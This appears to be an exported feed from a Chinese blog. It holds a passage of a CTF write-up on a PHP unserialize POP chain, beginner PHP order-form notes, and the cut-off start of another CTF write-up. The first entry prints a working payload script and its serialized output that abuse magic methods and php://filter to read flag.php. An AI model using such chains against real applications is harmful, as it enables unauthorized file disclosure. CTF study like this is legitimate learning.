class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰é­”æ³•æ–¹æ³•ï¼š<strong>__get</strong> ä»ä¸å¯è®¿é—®çš„å±æ€§ä¸­è¯»å–æ•°æ®ä¼šè§¦å‘<br>ä¼šè¿”å›functionä½œä¸ºå‡½æ•°è°ƒç”¨ã€‚</p><p>æ€è·¯å¾—å‡ºï¼š</p><p>â€‹        é¦–å…ˆååºåˆ—åŒ–å‡½æ•°ï¼Œè§¦å‘Showç±»ä¸­çš„wakeupæ–¹æ³•ï¼Œwakeupæ–¹æ³•åšå­—ç¬¦ä¸²å¤„ç†ï¼Œè§¦å‘tosringæ–¹æ³•ï¼Œå¦‚æœå°†strå®ä¾‹åŒ–ä¸ºTestï¼Œå› ä¸ºTestç±»ä¸­ä¸å«sourceå±æ€§ï¼Œæ‰€ä»¥è°ƒç”¨getæ–¹æ³•ï¼Œå°†functionå®ä¾‹åŒ–ä¸ºModifierç±»ï¼Œå³å¯è§¦å‘å…¶ä¸­invokeæ–¹æ³•ï¼Œæœ€ç»ˆè°ƒç”¨æ–‡ä»¶åŒ…å«å‡½æ•°ï¼Œè¯»å–flag.php</p><p>payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span> ;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;karsa&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Show(<span class="string">&#x27;aaa&#x27;</span>);</span><br><span class="line">$a-&gt;str = <span class="keyword">new</span> Test();</span><br><span class="line">$a-&gt;str-&gt;p = <span class="keyword">new</span> Modifier();</span><br><span class="line">$b = <span class="keyword">new</span> Show($a);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($b));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Br%3A1%3Bs%3A3%3A%22str%22%3Ba%3A1%3A%7Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A4%3A%22Read%22%3A1%3A%7Bs%3A3%3A%22var%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D%7D%7D</span><br></pre></td></tr></table></figure><p><img src="/2021/09/03/buu/19/image-20210904213507487.png" alt="image-20210904213507487"></p><p><img src="/2021/09/03/buu/19/image-20210904214001095.png" alt="image-20210904214001095"></p><h4 id="0x01çŸ¥è¯†ç‚¹"><a href="#0x01çŸ¥è¯†ç‚¹" class="headerlink" title="0x01çŸ¥è¯†ç‚¹"></a>0x01çŸ¥è¯†ç‚¹</h4><p>é€šè¿‡è¿™é¢˜å¥½å¥½å†æ¶è¡¥ä¸€æ¬¡æˆ‘çš„ä»£ç å®¡è®¡</p><h5 id="1-this-gt-p"><a href="#1-this-gt-p" class="headerlink" title="1.$this-&gt;p"></a>1.$this-&gt;p</h5><p>æ‘˜æŠ„äºä¸€ç¯‡æ–‡ç« ï¼š<a href="https://www.cnblogs.com/ytkah/p/9633690.html">https://www.cnblogs.com/ytkah/p/9633690.html</a></p><p>phpä¸­$this-&gt;çš„ç”¨æ³•ç®€å•ä»‹ç»</p><p>phpä¸­æˆ‘ä»¬ä¸€èˆ¬æ˜¯å…ˆå£°æ˜ä¸€ä¸ªç±»ï¼Œç„¶åç”¨è¿™ä¸ªç±»å»å®ä¾‹åŒ–å¯¹è±¡</p><p>$thisçš„å«ä¹‰æ˜¯è¡¨ç¤ºå®ä¾‹åŒ–åçš„å…·ä½“å¯¹è±¡</p><p>$this-&gt;è¡¨ç¤ºåœ¨ç±»æœ¬èº«å†…éƒ¨ä½¿ç”¨æœ¬ç±»çš„å±æ€§æˆ–è€…æ–¹æ³•</p><p>â€˜ -&gt; â€™ ç¬¦å·æ˜¯æ’å…¥å¼è§£å¼•ç”¨æ“ä½œç¬¦ã€‚</p><p>æ¢å¥è¯è¯´ï¼Œå®ƒæ˜¯æœ‰è°ƒç”¨ç”±å¼•ç”¨ä¼ é€’å‚æ•°çš„å­ç¨‹åºçš„æ–¹æ³•</p><p>ä¾‹å­ï¼š</p><p>æ¯”å¦‚æˆ‘ä»¬å£°æ˜ä¸€ä¸ªUserç±»ï¼Œå®ƒåªå«æœ‰ä¸€ä¸ªå±æ€§ $name</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $_name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç°åœ¨ï¼Œæˆ‘ä»¬ç»™Userç±»åŠ ä¸ªæ–¹æ³•ï¼Œå°±ç”¨getName()æ–¹æ³•ï¼Œè¾“å‡º$nameçš„å€¼å§</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $_name;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getName</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å¦‚ä½•ä½¿ç”¨å‘¢ï¼Ÿ</span></span><br><span class="line">$user1 = <span class="keyword">new</span> User();</span><br><span class="line">$user1-&gt;name = <span class="string">&#x27;å¼ ä¸‰&#x27;</span>;</span><br><span class="line">$user1-&gt;getName();        <span class="comment">//è¿™é‡Œå°±ä¼šè¾“å‡ºå¼ ä¸‰ï¼</span></span><br><span class="line">$user2 = <span class="keyword">new</span> User();</span><br><span class="line">$user2-&gt;name = <span class="string">&#x27;æå››&#x27;</span>;  </span><br><span class="line">$user2-&gt;getName();       <span class="comment">//è¿™é‡Œä¼šè¾“å‡ºæå››ï¼</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä¹Ÿä¸Šåœ¨çº¿å·¥å…·è¯•äº†ä¸‹</p><p><img src="/2021/09/03/buu/19/image-20210905155102186.png" alt="image-20210905155102186"></p><h5 id="2-PHPä¸­çš„é­”æœ¯æ–¹æ³•"><a href="#2-PHPä¸­çš„é­”æœ¯æ–¹æ³•" class="headerlink" title="2.PHPä¸­çš„é­”æœ¯æ–¹æ³•"></a>2.PHPä¸­çš„é­”æœ¯æ–¹æ³•</h5><p><a href="https://blog.csdn.net/weixin_45645113/article/details/105309695">https://blog.csdn.net/weixin_45645113/article/details/105309695</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__sleep() &#x2F;&#x2F;ä½¿ç”¨serializeæ—¶è§¦å‘</span><br><span class="line">__destruct() &#x2F;&#x2F;å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘</span><br><span class="line">__call() &#x2F;&#x2F;åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span><br><span class="line">__callStatic() &#x2F;&#x2F;åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span><br><span class="line">__get() &#x2F;&#x2F;ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®</span><br><span class="line">__set() &#x2F;&#x2F;ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§</span><br><span class="line">__isset() &#x2F;&#x2F;åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘</span><br><span class="line">__unset() &#x2F;&#x2F;åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘</span><br><span class="line">__toString() &#x2F;&#x2F;æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘</span><br><span class="line">__invoke() &#x2F;&#x2F;å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</span><br></pre></td></tr></table></figure><h5 id="3-è¿›ä¸€æ­¥ç†è§£æœ¬é¢˜ä»£ç "><a href="#3-è¿›ä¸€æ­¥ç†è§£æœ¬é¢˜ä»£ç " class="headerlink" title="3.è¿›ä¸€æ­¥ç†è§£æœ¬é¢˜ä»£ç "></a>3.è¿›ä¸€æ­¥ç†è§£æœ¬é¢˜ä»£ç </h5><p>_invoke()å‡½æ•°ï¼šå¯¹è±¡æœ¬èº«æ˜¯ä¸èƒ½å¤Ÿå½“ä½œå‡½æ•°ä½¿ç”¨çš„ï¼Œä¸€æ—¦è¢«å½“ä½œå‡½æ•°ä½¿ç”¨ï¼Œï¼Œå°±ä¼šå›è°ƒæ‰§è¡Œ _invoke()æ–¹æ³•</p><p>_construct()å‡½æ•°ï¼šæ„é€ å‡½æ•°/æ–¹æ³•</p><p>æ„é€ å‡½æ•°ï¼ˆconstructor methodï¼Œä¹Ÿç§°ä¸ºæ„é€ å™¨ï¼‰æ˜¯ç±»ä¸­çš„ä¸€ç§ç‰¹æ®Šå‡½æ•°ï¼Œå½“ä½¿ç”¨ new å…³é”®å­—å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œæ„é€ å‡½æ•°å°†ä¼šè‡ªåŠ¨è°ƒç”¨ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public function __construct(å‚æ•°åˆ—è¡¨)&#123;</span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_get()å‡½æ•°ï¼š è®¿é—®ä¸å­˜åœ¨çš„æˆå‘˜å˜é‡æ—¶è§¦å‘</p><p>ä½œè€…è¿™æ®µè¯ä»Šå¤©çœ‹æ‡‚äº†ç‚¹</p><p><img src="/2021/09/03/buu/19/image-20210905161234966.png" alt="image-20210905161234966"></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP and MySQL Web Development(ä¸€)</title>
      <link href="/2021/09/03/php/1/"/>
      <url>/2021/09/03/php/1/</url>
      
        <content type="html"><![CDATA[<p> ä»åˆ›å»ºç¤ºä¾‹Webåº”ç”¨å¼€å§‹ï¼šBobçš„æ±½è½¦é›¶éƒ¨ä»¶å•†åº—</p><p>åˆ›å»ºè®¢å•è¡¨å•ï¼š</p><p>ä»»ä½•æœåŠ¡å™¨ç«¯è„šæœ¬è¯­è¨€æœ€å¸¸è§çš„åº”ç”¨åœºæ™¯æ˜¯ä¹‹ä¸€</p><p>1.1</p><p>å°±æ˜¯å¤„ç†HTMLè¡¨å•ã€‚</p><p>æ¥ä¸‹æ¥ç¨‹åºæ¸…å•1-1ï¼šorder.htmlï¼Œå•†åº—åŸºç¡€HTMLä»£ç </p><p><img src="/2021/09/03/php/1/image-20210903110152375.png" alt="image-20210903110152375"></p><p>å‘ˆç°ç”»é¢</p><form action="processorder.php" method="post"><table style="border: 0px;"><tr style="background: #cccccc;">    <td style="width: 150px; text-align: center;">Item</td>    <td style="width: 15px; text-align: center;">Quantity</td></tr><tr>    <td>Tries</td>    <td><input type="text" name="tireqty" size="3" maxlength="3"></td></tr><tr>    <td>Oil</td>    <td><input type="text" name="oilqty" size="3" maxlength="3"></td></tr><tr>    <td>Spark Plugs</td>    <td><input type="text" name="sparkqty" size="3" maxlength="3"></td></tr><tr>    <td colspan="2" style="text-align" : center;"><input type="submit" value="Submit Order"></td>    </tr>    </table>    </form><p>æ³¨æ„ï¼šè¯¥è¡¨å•çš„actionå±æ€§è¢«è®¾ç½®ä¸ºèƒ½å¤Ÿå¤„ç†å®¢æˆ·è®¢å•çš„PHPè„šæœ¬åç§°ï¼Œåç»­ä¼šå¯¹è¯¥è„šæœ¬è¿›è¡Œå¢æ·»ã€‚</p><p>ä¸€èˆ¬åœ°ï¼Œactionså±æ€§å°±æ˜¯ç”¨æˆ·ç‚¹å‡»æäº¤æŒ‰é’®æ—¶å°†è¦è½½å…¥çš„URL</p><p>ç”¨æˆ·åœ¨è¡¨å•ä¸­è¾“å…¥çš„æ•°æ®å°†æŒ‰ç…§methodå±æ€§ä¸­æŒ‡å®šçš„HTTPæ–¹æ³•å‘é€åˆ°è¿™ä¸ªURLï¼Œè¯¥æ–¹æ³•æ˜¯getï¼ˆé™„åŠ åœ¨URLçš„ç»“å°¾ï¼‰æˆ–è€…postï¼ˆä»¥å•ç‹¬çš„ä¿¡æ¯å‘é€ï¼‰ã€‚</p><p>1.2</p><p>è¡¨å•çš„å¤„ç†ï¼Œéœ€è¦åˆ›å»ºåœ¨formæ ‡è®°çš„actionå±æ€§ä¸­æŒ‡å®šçš„å¤„ç†è„šæœ¬ï¼Œè¯¥è„šæœ¬ä¸ºprocessorder.phpï¼Œä»£ç å¦‚ä¸‹</p><p><img src="/2021/09/03/php/1/image-20210903110937097.png" alt="image-20210903110937097"></p><p>æˆ‘ä»¬åœ¨h2å¤„æ·»åŠ äº†phpä»£ç </p><p>è¿™æ ·æˆ‘ä»¬çœ‹åˆ°phpçš„echoè¾“å‡ºè¯­å¥åŒæ—¶ï¼Œ</p><p>åœ¨htmlé¡µé¢ç‚¹å‡»Submit Orderä¹Ÿä¼šæœ‰ç±»ä¼¼å†…å®¹æ˜¾ç¤º</p><p><img src="/2021/09/03/php/1/image-20210903150404934.png" alt="image-20210903150404934"></p><p>è¯·æ³¨æ„</p><p>æˆ‘ä»¬æ‰€ç¼–å†™çš„PHPä»£ç æ˜¯å¦‚ä½•åµŒå…¥åˆ°ä¸€ä¸ªå¸¸è§çš„HTMLæ–‡ä»¶ä¸­çš„</p><p>é€šè¿‡æµè§ˆå™¨ï¼Œæˆ‘ä»¬æŸ¥çœ‹è¯¥HTMLçš„æºä»£ç </p><p><img src="/2021/09/03/php/1/image-20210903150637332.png" alt="image-20210903150637332"></p><p>ä»¥ä¸Šä»£ç å¹¶æ²¡æœ‰æ˜¾ç¤ºåŸå§‹çš„PHPè¯­å¥</p><p>è¿™æ˜¯å› ä¸ºPHPè§£é‡Šå™¨å·²ç»è¿è¡Œäº†è¯¥è„šæœ¬ï¼Œå¹¶ä¸”ç”¨è¯¥è„šæœ¬çš„è¾“å‡ºä»£æ›¿äº†è„šæœ¬çš„æœ¬èº«ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œé€šè¿‡PHPï¼Œæˆ‘ä»¬å¯ä»¥ç”Ÿæˆèƒ½åœ¨ä»»ä½•æµè§ˆå™¨ä¸­æŸ¥çœ‹çš„çº¯HTMLï¼Œæ¢ä¸€ä¸ªæ„æ€ç†è§£ï¼Œç”¨æˆ·çš„æµè§ˆå¹¶ä¸éœ€è¦ç†è§£PHPã€‚</p><p>æ­¤æ–‡ä»¶ç»„æˆï¼š</p><p>1.HTML 2.PHPæ ‡è®° 3.PHPè¯­å¥ 4.ç©ºæ ¼</p><p>1.3.1</p><p>PHPæ ‡è®°</p><?php    ä¸ºå¼€å§‹ï¼Œ?><p>ä¸ºç»“æŸ</p><p>â€‹        è¿™æ ·çš„æ ‡è®°ç§°ä½œPHPæ ‡è®°ï¼Œå¯ä»¥å‘Šè¯‰æœåŠ¡å™¨PHPä»£ç çš„å¼€å§‹å’Œç»“æŸã€‚</p><p>XMLé£æ ¼(å»ºè®®ä½¿ç”¨)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo &#39;&lt;p&gt;Order processed.&lt;&#x2F;p&gt;&#39;; ?&gt;</span><br></pre></td></tr></table></figure><p>ç®€çŸ­é£æ ¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;? echo &#39;&lt;p&gt;Order processed.&lt;&#x2F;p&gt;&#39;; ?&gt;</span><br></pre></td></tr></table></figure><p>1.3.2</p><p>PHPè¯­å¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;&lt;p&gt;Order processed.&lt;&#x2F;p&gt;&#39;;</span><br></pre></td></tr></table></figure><p>echoè¯­å¥ï¼šå°†ä¼ é€’ç»™å…¶è‡ªèº«çš„å­—ç¬¦ä¸²æ‰“å°æˆ–è€…å›æ˜¾åˆ°æµè§ˆå™¨</p><p>1.7.1</p><p>PHPçš„æ•°æ®ç±»å‹</p><p>1.æ•´æ•°    Integer</p><p>2.æµ®ç‚¹æ•°    Float</p><p>3.å­—ç¬¦ä¸²    String</p><p>4.å¸ƒå°”    Boolean</p><p>5.æ•°ç»„    Array</p><p>6.å¯¹è±¡    Object</p><p>é™„ï¼šä¸‰ä¸ªç‰¹æ®Šç±»å‹ NULLï¼ˆç©ºï¼‰ã€resourceï¼ˆèµ„æºï¼‰ã€</p><p>callable ã€‚</p><p>1.7.2</p><p>ç±»å‹å¼ºåº¦</p><p>PHPæ˜¯ä¸€ç§å¼±ç±»å‹ï¼Œæˆ–è€…åŠ¨æ€å‹è¯­è¨€</p><p>ä¾‹å­ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$total1 &#x3D; 0;</span><br><span class="line"></span><br><span class="line">$total2 &#x3D; 0.00;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼Œ$total1æ˜¯ä¸€ä¸ªæ•´æ•°ç±»å‹çš„å˜é‡</p><p>è€Œ$total2æ˜¯ä¸€ä¸ªæµ®ç‚¹ç±»å‹çš„å˜é‡ã€‚</p><p>è‹¥æ·»åŠ ä»¥ä¸‹ä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$total2 &#x3D; &#39;Hello&#39;;</span><br></pre></td></tr></table></figure><p>åˆ™$total2æ˜¯å­—ç¬¦ä¸²ç±»å‹çš„å˜é‡ã€‚</p><p>1.7.3</p><p>ç±»å‹è½¬æ¢</p><p>1.7.4</p><p>å¯å˜å˜é‡</p><p>é™„ä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line">     &lt;title&gt;Bob&#39;s Auto Parts - Order Results&lt;&#x2F;title&gt;</span><br><span class="line"> &lt;&#x2F;head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line"> &lt;h1&gt;Bob&#39;s Auto Parts&lt;&#x2F;h1&gt;</span><br><span class="line"> &lt;h2&gt;Order Results&lt;&#x2F;h2&gt;</span><br><span class="line">&lt;!-- --&gt;&lt;?php</span><br><span class="line">&#x2F;&#x2F;  echo &#39;&lt;p&gt; Order Processed.&lt;&#x2F;p&gt;&#39;</span><br><span class="line">&#x2F;&#x2F; ?&gt;</span><br><span class="line">&lt;!-- --&gt;&lt;?php</span><br><span class="line">&#x2F;&#x2F;    echo &quot;&lt;p&gt;Order processed at &quot;;</span><br><span class="line">&#x2F;&#x2F;    echo date(&#39;H:i, jS F Y&#39;);</span><br><span class="line">&#x2F;&#x2F;    echo &quot;&lt;&#x2F;p&gt;&quot;</span><br><span class="line">&#x2F;&#x2F; ?&gt;</span><br><span class="line"> &lt;?php</span><br><span class="line">  echo &quot;&lt;p&gt;Order processed at &quot;.date(&#39;H:i, jS F Y&#39;).&quot;&lt;&#x2F;p&gt;&quot;</span><br><span class="line"> ?&gt;</span><br><span class="line"> &lt;?php</span><br><span class="line">  $tireqty &#x3D; $_POST[&#39;tireqty&#39;];</span><br><span class="line">  $oilqty &#x3D; $_POST[&#39;oilqty&#39;];</span><br><span class="line">  $sparkqty &#x3D; $_POST[&#39;sparkqty&#39;];</span><br><span class="line">  $address &#x3D; $_POST[&#39;address&#39;];</span><br><span class="line">  echo &#39;&lt;p&gt;Your order is as follows: &lt;&#x2F;p&gt;&#39;;</span><br><span class="line">  echo htmlspecialchars($tireqty).&#39; tires&lt;br &#x2F;&gt;&#39;;</span><br><span class="line">  echo htmlspecialchars($oilqty).&#39; bottle of oil&lt;br &#x2F;&gt;&#39;;</span><br><span class="line">  echo htmlspecialchars($sparkqty).&#39; spark plugs&lt;br &#x2F;&gt;&#39;;</span><br><span class="line">  echo &#39;address is &#39;.htmlspecialchars($address);</span><br><span class="line"> ?&gt;</span><br><span class="line">&lt;!-- --&gt;&lt;?php</span><br><span class="line">&#x2F;&#x2F;  echo phpinfo();</span><br><span class="line">&#x2F;&#x2F; ?&gt;</span><br><span class="line"> &lt;?php</span><br><span class="line"> $totalqty  &#x3D; 0;</span><br><span class="line"> $totalqty &#x3D; $tireqty + $oilqty + $sparkqty;</span><br><span class="line"> echo &quot;&lt;p&gt;Items ordered :&quot;. $totalqty.&quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line"> $totalomunt &#x3D; 0.00;</span><br><span class="line"></span><br><span class="line"> define(&#39;TIREPRICE&#39;, 100);</span><br><span class="line"> define(&#39;OILPRICE&#39;, 10);</span><br><span class="line"> define(&#39;SPARKPRICE&#39;, 4);</span><br><span class="line"> $totalomunt &#x3D; $tireqty * TIREPRICE</span><br><span class="line">     + $oilqty * OILPRICE</span><br><span class="line">     + $sparkqty * SPARKPRICE;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> echo &quot;Subtotal: $&quot;.number_format($totalomunt,2).&quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line"> $taxrate &#x3D; 0.10;</span><br><span class="line"> $totalomunt &#x3D; $totalomunt * (1+ $taxrate);</span><br><span class="line"> echo &quot;Total including tax: $&quot;.number_format($totalomunt,2).&quot;&lt;&#x2F;p&gt;&quot;</span><br><span class="line"> ?&gt;</span><br><span class="line">&lt;!-- --&gt;</span><br><span class="line"></span><br><span class="line"> &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF2020 EasySearch</title>
      <link href="/2021/09/02/buu/18/"/>
      <url>/2021/09/02/buu/18/</url>
      
        <content type="html"><![CDATA[<p> å‚è€ƒåšå®¢ï¼š</p><p><a href="https://blog.csdn.net/devilare/article/details/119351945">https://blog.csdn.net/devilare/article/details/119351945</a>    </p><p><a href="https://www.cnblogs.com/wangtanzhi/p/12354394.html![image-20210902195758511](18/image-20210902195758511.png)">https://www.cnblogs.com/wangtanzhi/p/12354394.html![image-20210902195758511](18/image-20210902195758511.png)</a></p><p>æ‰“å¼€ååªæœ‰ä¸€ä¸ªè¾“å…¥æ¡†</p><p>å°è¯•äº†ä¸€ä¸‹sqlæ³¨å…¥</p><p>åªä¼šå‡ºç°ä¸€æ ·çš„å¼¹æ¡†</p><p><img src="/2021/09/02/buu/18/image-20210902195901927.png" alt="image-20210902195901927"></p><p>æ‰«æç›®å½•åå‘ç°è¿˜æœ‰swpæ–‡ä»¶</p><p>è®¿é—®å¾—åˆ°æºç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ob_start();</span><br><span class="line">function get_hash()&#123;</span><br><span class="line">$chars &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#39;;</span><br><span class="line">$random 